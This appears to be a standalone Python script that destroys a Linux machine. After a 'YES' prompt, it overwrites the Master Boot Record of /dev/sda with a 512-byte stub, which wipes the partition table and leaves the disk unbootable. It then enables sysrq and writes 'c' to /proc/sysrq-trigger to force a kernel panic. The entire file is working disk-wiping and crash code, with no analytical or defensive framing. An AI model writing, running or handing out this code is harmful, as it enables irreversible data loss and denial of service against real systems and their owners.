import os
import sys
import ctypes
import subprocess

# Step 1: Confirm user wants to proceed
print("WARNING: This script will irreversibly destroy the Master Boot Record (MBR) and trigger a kernel panic.")
confirm = input("Type 'YES' to continue: ")
if confirm.strip().upper() != "YES":
    print("Aborted by user.")
    sys.exit(0)

# Step 2: Overwrite MBR
device = "/dev/sda"  # Change to your disk device
print(f"[*] Overwriting MBR on {device}...")

# Simple MBR payload: valid signature only
mbr_payload = bytes([0xFA, 0x31, 0xC0, 0x8E, 0xD0] + [0x00] * (510 - 5) + [0x55, 0xAA])

try:
    with open(device, "rb+") as f:
        f.write(mbr_payload)
    print("[+] MBR successfully overwritten.")
except PermissionError:
    print("[-] Permission denied. Run as root.")
    sys.exit(1)
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)

# Step 3: Trigger Linux kernel panic (BSOD equivalent)
print("[*] Triggering kernel panic...")

try:
    # Enable sysrq and use magic sysrq-trigger
    subprocess.run(["sysctl", "-w", "kernel.sysrq=1"])
    with open("/proc/sysrq-trigger", "w") as f:
        f.write("c")  # 'c' = crash (kernel panic)
except Exception as e:
    print(f"[-] Failed to trigger kernel panic: {e}")